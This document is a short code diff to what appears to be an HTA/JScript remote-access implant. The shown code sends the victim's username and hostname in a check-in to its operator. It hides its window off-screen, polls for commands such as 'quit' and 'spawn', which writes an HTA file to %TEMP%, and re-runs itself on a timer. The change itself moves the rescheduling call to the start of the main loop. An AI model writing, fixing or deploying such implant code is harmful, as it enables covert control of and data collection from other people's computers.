@@ -142,6 +142,7 @@ function b64d(data, type) {
 
 var checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //initial checkin
 function main() {
+  window.setTimeout("main()", sleepytime, "JScript")
   try {
     window.moveTo(-69, -420);
 
@@ -175,7 +176,6 @@ function main() {
           if(cmnd == "quit") {
             quit();
           }
-          
 
           //spawn: writes hta to %TEMP%
           else if(cmnd.split(" ")[0] == "spawn") {
@@ -287,7 +287,6 @@ function main() {
   catch (e) {
     checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //error - set idle checkin
   }
-  window.setTimeout("main()", sleepytime, "JScript")
 }
 main()
 </script>
